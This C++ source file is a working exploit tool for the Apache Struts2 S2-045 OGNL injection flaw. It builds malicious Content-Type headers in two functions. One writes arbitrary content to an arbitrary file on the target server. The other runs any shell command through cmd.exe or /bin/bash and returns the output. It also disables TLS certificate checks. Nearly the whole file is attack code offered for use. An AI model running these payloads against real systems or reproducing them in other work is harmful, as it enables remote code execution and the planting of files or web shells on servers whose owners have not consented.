#include "stdafx.h"
#include "scan.h"
#include <comutil.h>
#pragma comment(lib, "comsuppw.lib")

string ws2s(const wstring& ws)
{
	_bstr_t t = ws.c_str();
	char* pchar = (char*)t;
	string result = pchar;
	return result;
}

wstring s2ws(const string& s)
{
	_bstr_t t = s.c_str();
	wchar_t* pwchar = (wchar_t*)t;
	wstring result = pwchar;
	return result;
}

int s2045_upload(const wstring url, const wstring filename, const wstring filecontent, string &cresult)
{
	wstring new_url;
	new_url.append(url.c_str());
	new_url.append(L"?t=");
	new_url.append(filecontent.c_str());
	new_url.append(L"&f=");
	new_url.append(filename.c_str());


	string result;

	DWORD flags = INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE;
	wchar_t szHostName[MAX_PATH] = { 0 };
	wchar_t *lpszUrlPath = new wchar_t[new_url.size()];
	memset(lpszUrlPath, 0, sizeof(wchar_t)*new_url.size());
	URL_COMPONENTS uc = { 0 };
	uc.dwStructSize = sizeof(uc);
	uc.lpszHostName = szHostName;
	uc.dwHostNameLength = sizeof(szHostName);
	uc.lpszUrlPath = lpszUrlPath;
	uc.dwUrlPathLength = sizeof(wchar_t)*new_url.size();
	InternetCrackUrl(new_url.c_str(), new_url.size(), 0, &uc);
	if (uc.nScheme == INTERNET_SCHEME_HTTPS)
		flags |= (SECURITY_IGNORE_ERROR_MASK |
		SECURITY_INTERNET_MASK | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
		INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
		INTERNET_FLAG_RELOAD);
	
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
	hSession = InternetOpen(_T("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome / 56.0.2924.87 Safari / 537.36"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hSession)
	{
		delete[]lpszUrlPath;
		return -1;
	}
	hConnect = InternetConnect(hSession, szHostName,
		uc.nPort,
		NULL,
		NULL,
		INTERNET_SERVICE_HTTP,
		0,
		1);
	if (!hConnect)
	{
		delete[]lpszUrlPath;
		InternetCloseHandle(hSession);
		return -1;
	}
	hRequest = HttpOpenRequest(hConnect, _T("GET"), lpszUrlPath, HTTP_VERSION, NULL, NULL, flags, 1);
	//delete[]lpszUrlPath;
	if (!hRequest)
	{
		
		InternetCloseHandle(hSession);
		InternetCloseHandle(hConnect);
		return -1;
	}
	if (uc.nScheme == INTERNET_SCHEME_HTTPS)
	{
		BOOL f;
		DWORD flags = 0; DWORD len = sizeof(flags);
		f = InternetQueryOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, &len);
		flags |= (SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_WRONG_USAGE);
		InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
	}
	HttpAddRequestHeadersA(hRequest, ("Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*"), -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
	string payload;
	payload.append("Content-Type: %{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#fos= new java.io.FileOutputStream(#req.getParameter(\"f\")),#fos.write(#req.getParameter(\"t\").getBytes()),#fos.close()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(\"okokokok\"),(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())))}");
	
	HttpAddRequestHeadersA(hRequest, "User-Agent: Mozilla/5.0", -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
	HttpAddRequestHeadersA(hRequest, payload.c_str(), -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

	if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0))
	{
		DWORD dwError = GetLastError();
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return -2;
	}
	char buff[102400] = { 0 };
	DWORD dwReadSize = sizeof(buff)-1;
	DWORD dwReadByte;
	int count = 0;
	while (TRUE)
	{
		if (count >= dwReadSize)
		{
			break;
		}
		if (!InternetReadFile(hRequest, &buff[count], dwReadSize - count, &dwReadByte))
		{
			InternetCloseHandle(hSession);
			InternetCloseHandle(hConnect);
			InternetCloseHandle(hRequest);
			return -1;
		}
		if (dwReadByte < 1)
		{
			break;
		}

		count = count + dwReadByte;
	}

	result.append(buff);

	InternetCloseHandle(hSession);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hRequest);

	cresult.append(result);
	return dwReadByte;
	return 0;
}

int s2045_exec(const wstring url, const wstring tcmd, string &cresult)
{
	string cmd = ws2s(tcmd);
	string result;

	DWORD flags = INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE;
	wchar_t szHostName[MAX_PATH] = { 0 };
	wchar_t szUrlPath[4096] = { 0 };
	URL_COMPONENTS uc = { 0 };
	uc.dwStructSize = sizeof(uc);
	uc.lpszHostName = szHostName;
	uc.dwHostNameLength = sizeof(szHostName);
	uc.lpszUrlPath = szUrlPath;
	uc.dwUrlPathLength = sizeof(szUrlPath);
	InternetCrackUrl(url.c_str(), url.size(), 0, &uc);
	if (uc.nScheme == INTERNET_SCHEME_HTTPS)
		flags |= (SECURITY_IGNORE_ERROR_MASK |
		SECURITY_INTERNET_MASK | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
		INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
		INTERNET_FLAG_RELOAD);
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
	hSession = InternetOpen(_T("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome / 56.0.2924.87 Safari / 537.36"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hSession)
	{
		return -1;
	}
	hConnect = InternetConnect(hSession, szHostName,
		uc.nPort,
		NULL,
		NULL,
		INTERNET_SERVICE_HTTP,
		0,
		1);
	if (!hConnect)
	{
		InternetCloseHandle(hSession);
		return -1;
	}
	hRequest = HttpOpenRequest(hConnect, _T("GET"), szUrlPath, HTTP_VERSION, NULL, NULL, flags, 1);
	if (!hRequest)
	{
		InternetCloseHandle(hSession);
		InternetCloseHandle(hConnect);
		return -1;
	}
	if (uc.nScheme == INTERNET_SCHEME_HTTPS)
	{
		BOOL f;
		DWORD flags = 0; DWORD len = sizeof(flags);
		f = InternetQueryOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, &len);
		flags |= (SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_WRONG_USAGE);
		InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
	}
	HttpAddRequestHeadersA(hRequest, ("Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*"), -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
	char payload[10240] = { 0 };
	strcat_s(payload, "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='");
	strcat_s(payload,"\"");
	strcat_s(payload,cmd.c_str());
	strcat_s(payload, "\"");
	strcat_s(payload, "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
	//sprintf_s(payload, "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='%s').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",cmd.c_str());
	HttpAddRequestHeadersA(hRequest, "User-Agent: Mozilla/5.0", -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
	HttpAddRequestHeadersA(hRequest, payload, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

	if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0))
	{
		DWORD dwError = GetLastError();
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return -2;
	}
	char buff[102400] = { 0 };
	DWORD dwReadSize = sizeof(buff)-1;
	DWORD dwReadByte;
	int count = 0;
	while (TRUE)
	{
		if (count >= dwReadSize)
		{
			break;
		}
		if (!InternetReadFile(hRequest, &buff[count], dwReadSize - count, &dwReadByte))
		{
			InternetCloseHandle(hSession);
			InternetCloseHandle(hConnect);
			InternetCloseHandle(hRequest);
			return -1;
		}
		if (dwReadByte < 1)
		{
			break;
		}
		
		count = count + dwReadByte;
	}
	
	result.append(buff);

	InternetCloseHandle(hSession);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hRequest);

	cresult.append(result);
	return dwReadByte;
}